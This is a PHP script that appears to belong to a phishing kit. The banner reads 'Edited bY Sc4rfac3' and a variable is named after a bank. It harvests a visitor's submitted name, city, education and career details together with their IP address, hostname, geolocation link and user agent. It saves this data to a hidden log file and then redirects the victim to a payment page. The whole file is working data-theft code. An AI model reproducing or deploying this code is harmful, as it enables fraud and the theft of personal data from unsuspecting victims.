<?php

if (isset($_POST['btnstart'])) {
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";
	
	$message .= "Nombre           : ".$_POST['name']."\n";
	$message .= "Ciudad            : ".$_POST['ciudad']."\n";
	$message .= "Formacion            : ".$_POST['sl2']."\n";
	$message .= "Situacion profesional            : ".$_POST['sl1']."\n";
	$message .= "Carrera            : ".$_POST['sl3']."\n";


	
	
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- Edited bY Sc4rfac3 --------------|\n";

	
	$save=fopen("access/login.txt","a+");
	          fwrite($save,$message);
	          fclose($save);

	          $discoverbank = [
              'text' => $message
              ]; 

		header("Location: ../payment");

	
}

?>